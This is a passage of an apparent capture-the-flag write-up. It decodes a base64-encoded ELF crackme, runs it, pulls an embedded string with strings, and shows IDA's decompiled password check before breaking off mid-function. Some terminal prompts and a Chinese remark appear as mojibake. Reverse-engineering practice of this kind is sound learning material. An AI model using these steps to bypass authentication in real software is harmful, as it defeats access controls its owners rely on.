AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAJHVwZXJaZWNyZXRQ
NHp6AEVudGVyIHBhc3N3ZDogACVzAEFsbW9zdABDb3JyZWN0AHJlYWxseSBjbG9zZQBDbG9zZQBJ
bmNvcnJlY3QAAAABGwM7KAAAAAQAAADM7///dAAAAAzw//+cAAAAHPD//0QAAAAF8f//tAAAABQA
AAAAAAAAAXpSAAF4EAEbDAcIkAEHEBQAAAAcAAAA0O///yIAAAAAAAAAAAAAABQAAAAAAAAAAXpS
AAF4EAEbDAcIkAEAACQAAAAcAAAAUO///0AAAAAADhBGDhhKDwt3CIAAPxo7KjMkIgAAAAAUAAAA
RAAAAGjv//8IAAAAAAAAAAAAAAAcAAAAXAAAAEnw//9PAQAAAEEOEIYCQw0GA0oBDAcIAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFARAAAAAAAAEBEAAAAA
AAABAAAAAAAAAD8AAAAAAAAADAAAAAAAAAAAEAAAAAAAAA0AAAAAAAAAqBIAAAAAAAAZAAAAAAAA
ANA9AAAAAAAAGwAAAAAAAAAIAAAAAAAAABoAAAAAAAAA2D0AAAAAAAAcAAAAAAAAAAgAAAAAAAAA
9f7/bwAAAACgAwAAAAAAAAUAAAAAAAAAoAQAAAAAAAAGAAAAAAAAAMgDAAAAAAAACgAAAAAAAACv
AAAAAAAAAAsAAAAAAAAAGAAAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAwAAAAAAAADoPwAAAAAAAAIA
AAAAAAAASAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABoBgAAAAAAAAcAAAAAAAAAqAUA
AAAAAAAIAAAAAAAAAMAAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPv//28AAAAAAAAACAAAAAD+//9v
AAAAAGgFAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAUAUAAAAAAAD5//9vAAAAAAMAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAA4D0AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAA
AAAAAAAAAAAgQAAAAAAAAEdDQzogKERlYmlhbiAxMi4yLjAtMSkgMTIuMi4wAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAACQAAAAEABAB8AwAAAAAAACAA
AAAAAAAAEwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAHgAAAAIADwCgEAAAAAAAAAAAAAAAAAAAIAAA
AAIADwDQEAAAAAAAAAAAAAAAAAAAMwAAAAIADwAQEQAAAAAAAAAAAAAAAAAASQAAAAEAGgAoQAAA
AAAAAAEAAAAAAAAAVQAAAAEAFQDYPQAAAAAAAAAAAAAAAAAAfAAAAAIADwBQEQAAAAAAAAAAAAAA
AAAAiAAAAAEAFADQPQAAAAAAAAAAAAAAAAAApwAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAEwAAAAQA
8f8AAAAAAAAAAAAAAAAAAAAArgAAAAEAEwAoIQAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAA
AAAAAAAAAAAAvAAAAAEAFgDgPQAAAAAAAAAAAAAAAAAAxQAAAAAAEgBUIAAAAAAAAAAAAAAAAAAA
2AAAAAEAGADoPwAAAAAAAAAAAAAAAAAA7gAAABIAAAAAAAAAAAAAAAAAAAAAAAAACwEAACAAAAAA
AAAAAAAAAAAAAAAAAAAAXAEAACAAGQAYQAAAAAAAAAAAAAAAAAAAJwEAABAAGQAoQAAAAAAAAAAA
AAAAAAAALgEAABICEACoEgAAAAAAAAAAAAAAAAAANAEAABIAAAAAAAAAAAAAAAAAAAAAAAAARwEA
ABIAAAAAAAAAAAAAAAAAAAAAAAAAWgEAABAAGQAYQAAAAAAAAAAAAAAAAAAAZwEAACAAAAAAAAAA
AAAAAAAAAAAAAAAAdgEAABECGQAgQAAAAAAAAAAAAAAAAAAAgwEAABEAEQAAIAAAAAAAAAQAAAAA
AAAAkgEAABAAGgAwQAAAAAAAAAAAAAAAAAAAYAEAABIADwBwEAAAAAAAACIAAAAAAAAAlwEAABAA
GgAoQAAAAAAAAAAAAAAAAAAAowEAABIADwBZEQAAAAAAAE8BAAAAAAAAqAEAABIAAAAAAAAAAAAA
AAAAAAAAAAAAwQEAABECGQAoQAAAAAAAAAAAAAAAAAAAzQEAACAAAAAAAAAAAAAAAAAAAAAAAAAA
5wEAACIAAAAAAAAAAAAAAAAAAAAAAAAAAgIAABICDAAAEAAAAAAAAAAAAAAAAAAAAFNjcnQxLm8A
X19hYmlfdGFnAGNydHN0dWZmLmMAZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRv
cnNfYXV4AGNvbXBsZXRlZC4wAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5
AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBmaWxlLmMAX19GUkFN
RV9FTkRfXwBfRFlOQU1JQwBfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVf
AF9fbGliY19zdGFydF9tYWluQEdMSUJDXzIuMzQAX0lUTV9kZXJlZ2lzdGVyVE1DbG9uZVRhYmxl
AF9lZGF0YQBfZmluaQBzdHJsZW5AR0xJQkNfMi4yLjUAcHJpbnRmQEdMSUJDXzIuMi41AF9fZGF0
YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX2VuZABf
X2Jzc19zdGFydABtYWluAF9faXNvYzk5X3NjYW5mQEdMSUJDXzIuNwBfX1RNQ19FTkRfXwBfSVRN
X3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplQEdMSUJDXzIuMi41AF9pbml0AAAu
c3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3Rl
LmdudS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdu
dS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5n
b3QALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJh
eQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21tZW50AAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAGAMAAAAAAAAYAwAAAAAAABwAAAAAAAAAAAAAAAAAAAAB
AAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAADgDAAAAAAAAOAMAAAAAAAAgAAAAAAAAAAAA
AAAAAAAACAAAAAAAAAAAAAAAAAAAADYAAAAHAAAAAgAAAAAAAABYAwAAAAAAAFgDAAAAAAAAJAAA
AAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABJAAAABwAAAAIAAAAAAAAAfAMAAAAAAAB8AwAA
AAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAVwAAAPb//28CAAAAAAAAAKADAAAA
AAAAoAMAAAAAAAAkAAAAAAAAAAYAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGEAAAALAAAAAgAAAAAA
AADIAwAAAAAAAMgDAAAAAAAA2AAAAAAAAAAHAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABpAAAAAwAA
AAIAAAAAAAAAoAQAAAAAAACgBAAAAAAAAK8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA
cQAAAP///28CAAAAAAAAAFAFAAAAAAAAUAUAAAAAAAASAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAAC
AAAAAAAAAH4AAAD+//9vAgAAAAAAAABoBQAAAAAAAGgFAAAAAAAAQAAAAAAAAAAHAAAAAQAAAAgA
AAAAAAAAAAAAAAAAAACNAAAABAAAAAIAAAAAAAAAqAUAAAAAAACoBQAAAAAAAMAAAAAAAAAABgAA
AAAAAAAIAAAAAAAAABgAAAAAAAAAlwAAAAQAAABCAAAAAAAAAGgGAAAAAAAAaAYAAAAAAABIAAAA
AAAAAAYAAAAYAAAACAAAAAAAAAAYAAAAAAAAAKEAAAABAAAABgAAAAAAAAAAEAAAAAAAAAAQAAAA
AAAAFwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACcAAAAAQAAAAYAAAAAAAAAIBAAAAAA
AAAgEAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAApwAAAAEAAAAGAAAAAAAA
AGAQAAAAAAAAYBAAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAALAAAAABAAAA
BgAAAAAAAABwEAAAAAAAAHAQAAAAAAAAOAIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC2
AAAAAQAAAAYAAAAAAAAAqBIAAAAAAACoEgAAAAAAAAkAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAA
AAAAAAAAvAAAAAEAAAACAAAAAAAAAAAgAAAAAAAAACAAAAAAAABSAAAAAAAAAAAAAAAAAAAABAAA
AAAAAAAAAAAAAAAAAMQAAAABAAAAAgAAAAAAAABUIAAAAAAAAFQgAAAAAAAALAAAAAAAAAAAAAAA
AAAAAAQAAAAAAAAAAAAAAAAAAADSAAAAAQAAAAIAAAAAAAAAgCAAAAAAAACAIAAAAAAAAKwAAAAA
AAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA3AAAAA4AAAADAAAAAAAAANA9AAAAAAAA0C0AAAAA
AAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOgAAAAPAAAAAwAAAAAAAADYPQAAAAAA
ANgtAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD0AAAABgAAAAMAAAAAAAAA
4D0AAAAAAADgLQAAAAAAAOABAAAAAAAABwAAAAAAAAAIAAAAAAAAABAAAAAAAAAAqwAAAAEAAAAD
AAAAAAAAAMA/AAAAAAAAwC8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAP0A
AAABAAAAAwAAAAAAAADoPwAAAAAAAOgvAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAA
AAAAAAAGAQAAAQAAAAMAAAAAAAAAGEAAAAAAAAAYMAAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAA
AAAAAAAAAAAAAAAADAEAAAgAAAADAAAAAAAAAChAAAAAAAAAKDAAAAAAAAAIAAAAAAAAAAAAAAAA
AAAAAQAAAAAAAAAAAAAAAAAAABEBAAABAAAAMAAAAAAAAAAAAAAAAAAAACgwAAAAAAAAHgAAAAAA
AAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABIMAAAAAAA
AJADAAAAAAAAHQAAABIAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAA
2DMAAAAAAAAIAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAA
AAAAAAAAAOA1AAAAAAAAGgEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=                                                                                                                                                                                   
```

![image-20250612184500514](https://7r1umphk.github.io/image/202506121845914.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ base64 -d 21.txt &gt; 21
base64: invalid input
                         
```

ÂøΩÁï•ÈùûÊ≥ïÂ≠óÁ¨¶

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ base64 -d -i 21.txt &gt; 21
        
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ file 21            
21: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8d11d870b5649e8ca1a0b6777160c1fc53f1f051, for GNU/Linux 3.2.0, not stripped
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ./21       
Enter passwd: 123456
Almost                                                                                                                                                                       
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ strings 21                 
/lib64/ld-linux-x86-64.so.2
__cxa_finalize
__libc_start_main
strlen
__isoc99_scanf
printf
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
$uperZecretP4zz
Enter passwd: 
Almost
Correct
really close
Close
Incorrect
;*3$'
GCC: (Debian 12.2.0-1) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
file.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
_edata
_fini
strlen@GLIBC_2.2.5
printf@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
_end
__bss_start
main
__isoc99_scanf@GLIBC_2.7
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
       
```

ida

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[264]; // [rsp+0h] [rbp-120h] BYREF
  const char *v5; // [rsp+108h] [rbp-18h]
  int i; // [rsp+114h] [rbp-Ch]
  int v7; // [rsp+118h] [rbp-8h]
  int v8; // [rsp+11Ch] [rbp-4h]

  v5 = '$uperZecretP4zz';
  v8 = 0;
  v7 = 1;
  printf('Enter passwd: ');
  __isoc99_scanf('%s', s);
  if ( strlen(s) == 6 )
  {
    if ( s[0] == 80 )
    {
      for ( i = 1; i &lt;= 5; ++i )
      {
        v8 += s[i] - 48;
        v7 *= s[i] - 48;
      }
      if ( v8 == 24 &amp;&amp; v7 == 2048 )
      {
        if ( s[1] == 56 )
